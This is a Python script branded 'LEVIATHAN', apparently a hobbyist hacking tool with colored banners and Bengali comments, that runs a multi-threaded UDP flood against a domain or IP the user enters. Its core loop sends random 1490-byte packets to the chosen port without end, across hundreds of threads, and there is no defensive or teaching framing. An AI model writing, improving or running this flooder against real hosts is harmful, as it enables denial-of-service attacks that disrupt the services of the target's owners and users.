import os
import sys
import time
import socket
import random
import threading
from platform import system

# --- ULTRA HIGHLIGHTED COLORS ---
W = '\033[1;37m'  # White Bold
G = '\033[1;32m'  # Green Bold
R = '\033[1;31m'  # Red Bold
Y = '\033[1;33m'  # Yellow Bold
B = '\033[1;34m'  # Blue Bold
C = '\033[1;36m'  # Cyan Bold
M = '\033[1;35m'  # Magenta Bold
RE = '\033[0m'    # Reset
HG = '\033[1;42;30m' # Highlight Green
HR = '\033[1;41;37m' # Highlight Red
HB = '\033[1;44;37m' # Highlight Blue
HC = '\033[1;46;30m' # Highlight Cyan

def clear():
    os.system('cls' if system() == "Windows" else 'clear')

def logo():
    clear()
    print(f"""
{C}   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗
   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║
   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║
   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║
   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
           {HG}  SYSTEM VERSION: 4.0  {RE}   {HB}  POWER: MULTI-THREADED  {RE}
{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}
    """)

# ---------------------------------------------------------
# [!] WORKING PART (CORE ENGINE) - এই অংশটিই আসল কাজ করে
# ---------------------------------------------------------

sent = 0
def attack():
    global sent
    # প্যাকেট ডাটা জেনারেট করা (1490 bytes standard MTU)
    bytes_data = random._urandom(1490)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # লক্ষ্যবস্তুতে প্যাকেট পাঠানো
            sock.sendto(bytes_data, (target_ip, target_port))
            sent += 1
            # লাইভ স্ট্যাটাস প্রিন্ট (হাইলাইটেড)
            print(f"{G}LEVIATHAN_STRIKE {W}>> {R}{target_ip}{W} | {B}PORT:{Y}{target_port} {W}| {HG} SENT:{sent} {RE}", end="\r")
        except:
            pass

# ---------------------------------------------------------

def startup():
    clear()
    print(f"\n\n{B}[>] {W}BOOTING LEVIATHAN CORE ENGINE...")
    time.sleep(1)
    for i in range(1, 101, 5):
        sys.stdout.write(f"\r{B}[{G}{'█' * (i // 2)}{W}{'.' * (50 - (i // 2))}{B}] {Y}{i}%")
        sys.stdout.flush()
        time.sleep(0.03)
    print(f"\n\n{HG}  SUCCESS: ALL MODULES LOADED  {RE}\n")
    time.sleep(1)

startup()

while True:
    logo()
    print(f" {HC}  TARGET SELECTION  {RE} ")
    print(f"\n {G}[01]{W} ATTACK DOMAIN (URL)")
    print(f" {G}[02]{W} ATTACK DIRECT IP")
    print(f" {R}[00]{W} TERMINATE SYSTEM")
    
    choice = input(f"\n{C}╔═══[{G}Leviathan@Console{C}]\n╚══{B}> {Y}")

    if choice == '1':
        domain = input(f"\n{B}[?]{W} TARGET URL: {Y}")
        try:
            target_ip = socket.gethostbyname(domain)
            break
        except:
            print(f"{HR} ERROR: INVALID DOMAIN {RE}")
            time.sleep(2)
    elif choice == '2':
        target_ip = input(f"\n{B}[?]{W} TARGET IP: {Y}")
        break
    elif choice == '0':
        sys.exit()

# পোর্টের কনফিগারেশন
logo()
print(f" {HC}  ATTACK CONFIGURATION  {RE} ")
target_port = input(f"\n{W}TARGET PORT (Default 80): {Y}")
target_port = int(target_port) if target_port else 80

# থ্রেড কাউন্ট (পাওয়ার নির্ধারণ)
print(f"\n{Y}[!] Higher threads = More power but may slow your phone.")
thread_count = input(f"{W}THREADS (Recommend 500-1000): {Y}")
thread_count = int(thread_count) if thread_count else 500

# অ্যাটাক শুরু
print(f"\n{HR}  WARNING: LEVIATHAN IS LAUNCHING IN 3 SEC...  {RE}")
time.sleep(3)
clear()
logo()

# WORKING PART: থ্রেডগুলো চালু করা
for i in range(thread_count):
    thread = threading.Thread(target=attack)
    thread.daemon = True # যাতে টুল বন্ধ করলে থ্রেডও বন্ধ হয়
    thread.start()

# স্ক্রিন যাতে সাথে সাথে বন্ধ না হয়
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n\n{HR}  SYSTEM HALTED BY OPERATOR  {RE}")
    print(f"{HC} FINAL PACKET COUNT: {sent} {RE}")
    sys.exit()
